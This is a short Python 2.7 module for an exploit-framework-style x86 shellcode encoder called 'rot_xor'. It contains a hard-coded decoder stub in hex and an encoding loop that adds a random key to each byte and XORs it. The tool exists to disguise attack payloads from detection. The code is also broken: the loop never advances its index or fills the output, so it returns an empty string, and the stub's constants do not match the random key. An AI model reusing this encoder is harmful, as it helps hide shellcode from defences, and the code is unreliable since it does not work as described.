#!/usr/bin/python2.7
import random 

class Encoder:
	name = 'rot_xor'
	description = 'Add a random number to every byte and xor with previous one'
	arch = 'x86'
	rank = 'excellent'
	def encode(self, payload):
		number = random.choice(range(1,255))
		key = random.choice(range(1,255))
		opcode = []
		opcode.append(number)
		encoded = ''
		index = 0
		def stub():
			stub = "\xeb\x1c\x5e\x31\xc0\x31\xdb\x31\xc9\xb1\x16"
			stub += "\xb0\x66\xb3\x2a\x8a\x16\x30\xd0\x88\x06\x28"
			stub += "\x1e\x88\xd0\x46\xe2\xf3\xeb\x05\xe8\xdf\xff\xff\xff"
			return stub
		for char in bytearray(payload):
			byte = (char + key) % 256
			byte = byte ^ opcode[index]
		return encoded, stub() 
